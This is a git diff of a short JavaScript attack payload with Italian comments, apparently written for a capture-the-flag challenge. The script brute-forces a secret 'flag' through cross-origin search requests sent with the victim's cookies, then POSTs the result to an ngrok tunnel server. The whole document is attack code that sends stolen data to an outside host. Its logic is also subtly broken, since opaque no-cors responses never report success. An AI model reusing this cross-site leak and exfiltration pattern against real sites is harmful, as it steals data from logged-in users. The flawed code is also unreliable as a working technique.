@@ -1,60 +1,48 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rubare Flag</title>
-</head>
-<body>
-    <h1>Rubare la Flag dell'Architetto</h1>
+<script>
+const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
+const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\';
+let currentFlag = 'flag{'; // Inizio della flag
+let position = 5; // Posizione successiva da testare
 
-    <script>
-        const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
-        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\'; // Caratteri da testare
-        let currentFlag = 'flag{'; // Inizia con il prefisso conosciuto
-        let position = 5; // La posizione successiva da testare
-
-        const testChar = (position) => {
-            if (position < 100) { // Limite superiore per la lunghezza della flag
-                for (let char of chars) {
-                    const query = `${baseUrl}${currentFlag}${char}`;
-                    fetch(query, {
-                        method: 'GET',
-                        credentials: 'include',
-                        mode: 'no-cors' // Imposta a no-cors, non otterrai risposta dettagliata
-                    })
-                    .then(response => {
-                        // Verifica la risposta con un timeout (o altro metodo)
-                        // Non puoi accedere ai dettagli della risposta in modalità no-cors
-                        if (response.ok) {
-                            console.log(`Trovato carattere ${char} per la posizione ${position}`);
-                            currentFlag += char; // Aggiungi il carattere trovato
-                            testChar(currentFlag.length); // Chiama ricorsivamente per la prossima posizione
-                            return; // Esci per evitare richieste sovrapposte
-                        } else {
-                            console.log(`Carattere ${char} non valido per la posizione ${position}`);
-                        }
-                    })
-                    .catch(error => console.error('Errore:', error));
+const testChar = (position) => {
+    if (position < 100) { // Limite superiore
+        for (let char of chars) {
+            const query = `${baseUrl}${currentFlag}${char}`;
+            fetch(query, {
+                method: 'GET',
+                credentials: 'include',
+                mode: 'no-cors'
+            })
+            .then(response => {
+                // Non possiamo accedere alla risposta, quindi facciamo affidamento sul comportamento
+                // Potresti considerare un timeout o un meccanismo alternativo per il riconoscimento
+                if (response.ok) {
+                    console.log(`Trovato carattere ${char} per la posizione ${position}`);
+                    currentFlag += char; // Aggiungi carattere
+                    testChar(currentFlag.length); // Prossima posizione
+                    return; // Esci per evitare conflitti
+                } else {
+                    console.log(`Carattere ${char} non valido per la posizione ${position}`);
                 }
-            } else {
-                console.log(`Flag completa: ${currentFlag}`);
-                // Invia la flag al server Flask
-                fetch('https://9e94-87-4-142-72.ngrok-free.app/receive_flag', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: `flag=${encodeURIComponent(currentFlag)}`
-                })
-                .then(response => response.text())
-                .then(data => console.log(data))
-                .catch(error => console.error('Errore:', error));
-            }
-        };
+            })
+            .catch(error => console.error('Errore:', error));
+        }
+    } else {
+        console.log(`Flag completa: ${currentFlag}`);
+        // Invia la flag al tuo server Flask
+        fetch('https://9e94-87-4-142-72.ngrok-free.app/receive_flag', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: `flag=${encodeURIComponent(currentFlag)}`
+        })
+        .then(response => response.text())
+        .then(data => console.log(data))
+        .catch(error => console.error('Errore:', error));
+    }
+};
 
-        // Inizia il processo di test dei caratteri
-        testChar(position);
-    </script>
-</body>
-</html>
+// Inizia il test
+testChar(position);
+</script>
